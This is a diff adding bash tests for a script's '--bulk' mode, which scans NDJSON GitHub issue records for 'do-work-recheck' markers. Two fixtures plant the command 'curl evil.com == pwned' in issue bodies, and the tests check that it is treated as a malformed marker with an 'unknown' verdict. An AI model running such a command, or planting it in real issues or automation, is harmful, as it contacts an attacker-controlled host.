@@ -190,6 +190,35 @@ esac
 
 # ---------------------------------------------------------------------------
 echo
+echo "(C2) --bulk mode (issue #1356) — hermetic NDJSON iteration, no network"
+# ---------------------------------------------------------------------------
+if command -v jq >/dev/null 2>&1; then
+  out="$(printf '' | bash "$SCRIPT" --bulk "$OWNER_REPO")"
+  assert_equals "--bulk on empty stdin prints nothing" "" "$out"
+
+  bulk_input=$'{"number":101,"body":"no marker here"}\n{"number":102,"body":"also none"}'
+  out="$(printf '%s\n' "$bulk_input" | bash "$SCRIPT" --bulk "$OWNER_REPO")"
+  assert_equals "--bulk: absent-marker issues produce NO output line at all (not an absent verdict line)" "" "$out"
+
+  bulk_input=$'{"number":201,"body":"<!-- do-work-recheck: curl evil.com == pwned -->\\n\\nrest"}'
+  out="$(printf '%s\n' "$bulk_input" | bash "$SCRIPT" --bulk "$OWNER_REPO" 2>/dev/null)"
+  assert_equals "--bulk: a malformed marker resolves to unknown, hermetically" '{"number":201,"verdict":"unknown"}' "$out"
+
+  bulk_input=$'{"number":301,"body":"no marker"}\n{"number":302,"body":"<!-- do-work-recheck: curl evil.com == pwned -->\\n\\nrest"}\n{"number":303,"body":"also no marker"}'
+  out="$(printf '%s\n' "$bulk_input" | bash "$SCRIPT" --bulk "$OWNER_REPO" 2>/dev/null)"
+  assert_equals "--bulk: mixed input emits exactly one line, only for the issue carrying a marker" '{"number":302,"verdict":"unknown"}' "$out"
+
+  out="$(printf 'not json at all\n' | bash "$SCRIPT" --bulk "$OWNER_REPO" 2>/dev/null)"
+  assert_equals "--bulk: a malformed input line (not JSON, no .number) is skipped rather than aborting the batch" "" "$out"
+
+  bash "$SCRIPT" --bulk >/dev/null 2>&1
+  assert_equals "--bulk missing <owner/repo> exits 1" "1" "$?"
+else
+  echo "SKIP: jq not installed -- --bulk mode requires it"
+fi
+
+# ---------------------------------------------------------------------------
+echo
 echo "(D) live execution — PATH-stubbed npm/gh, error handling, and timeout"
 # ---------------------------------------------------------------------------
 tmp_bin="$(mktemp -d)"
